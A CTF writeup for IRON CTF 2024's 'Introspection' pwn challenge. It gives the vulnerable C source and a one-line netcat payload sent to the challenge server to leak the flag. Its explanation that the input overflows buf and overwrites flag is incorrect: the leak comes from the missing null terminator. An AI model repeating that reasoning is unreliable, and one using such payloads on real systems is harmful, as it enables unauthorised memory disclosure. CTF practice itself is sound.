---
title: "Introspection - IRON CTF 2024"
category: "pwn"
subcategory: "stack"
type: "writeup"
tags: ["pwn", "buffer-overflow", "graphql", "introspection", "stack", "iron-ctf", "iron-ctf-2024", "2024", "ctf-writeup"]
summary: "Challenge description is like below:"
source:
  name: "CTFtime writeup #39541"
  url: "https://ctftime.org/writeup/39541"
original_source: "https://medium.com/@embossdotar/ctf-writeup-iron-ctf-2024-introspection-e136feb0570a"
ctf:
  name: "IRON CTF 2024"
  year: 2024
  challenge: "Introspection"
---

## Metadata

- **CTF:** IRON CTF 2024
- **Task:** Introspection
- **Author team:** ctfrrteam
- **CTFtime:** <https://ctftime.org/writeup/39541>
- **Original writeup:** <https://medium.com/@embossdotar/ctf-writeup-iron-ctf-2024-introspection-e136feb0570a>

---
Hi All,

Challenge description is like below:  
" Know your inner self and get started with Pwn.  
Author: Vigneswar

nc pwn.1nf1n1ty.team 31698 "

There is attachment named ‘Introspection.zip’.

So, need to connect via [netcat](<https://en.wikipedia.org/wiki/Netcat>) with given source.

Quick note — if you want to solve it yourself, give yourself some time now — later it will be too late, because you will already see the solution; that means no such fun:P

There (.zip file), you can find .c file like below:

```  
#include <stdio.h>  
#include <stdlib.h>  
#include <unistd.h>

int main()  
{  
setvbuf(stdout, NULL, _IONBF, 0);  
setvbuf(stdin, NULL, _IONBF, 0);  
printf(“\033[32m\”Introspection is the key to unlocking your fullest potential; knowing yourself is the first step.\”\033[0m\n\n”);  
printf(“ — ChatGPT\n”);  
printf(“Have you thought about what you really wanted in life?\n”);  
char flag[50];  
FILE *file = fopen(“flag.txt”, “r”);  
if (file == NULL)  
{  
printf(“Error! flag.txt not found!”);  
exit(1);  
}  
fread(flag, 1, 50, file);  
char buf[1008];  
printf(“>> “);  
read(0, buf, 1008);  
printf(“I wish for you that you get %s”, buf);  
}  
```

It is about [buffer overflow](<https://en.wikipedia.org/wiki/Buffer_overflow>).

The program allocates a 1008-byte buffer (buf[1008]), and you can input data into this buffer with read(0, buf, 1008).  
Since flag[50] is also on the stack, it’s likely located near the buffer. Overwriting the contents of flag might allow you to leak it when the program echoes your input.

If we overflow the buf array with a payload longer than 1008 bytes, we might overwrite flag, causing the program to print part of it.

You can attempt to send a long input to overflow buf and overwrite flag. Try inputting a string longer than 1008 characters.

This will fill buf with As and attempt to overwrite the memory following buf with “BBBB”. If flag is located just after buf, it might get corrupted or overwritten. If so, the program will output “I wish for you that you get BBBB”, or part of the flag if we’re close enough in memory layout.

Solution — payload:

`python3 -c ‘print(“A” * 1008 + “BBBB”)’ | nc pwn.1nf1n1ty.team 31698`

![img](<https://miro.medium.com/v2/resize:fit:720/format:webp/1*rSXqTlcXu75NT2KDxAkm8w.png>)

Solution — flag, source: IRON CTF 2024

Flag:

**ironCTF{W0w!_Y0u_Just_OverWrite_the_Nul1!}**

Useful resource:  
<https://owasp.org/www-community/vulnerabilities/Buffer_Overflow>

I hope you enjoy!
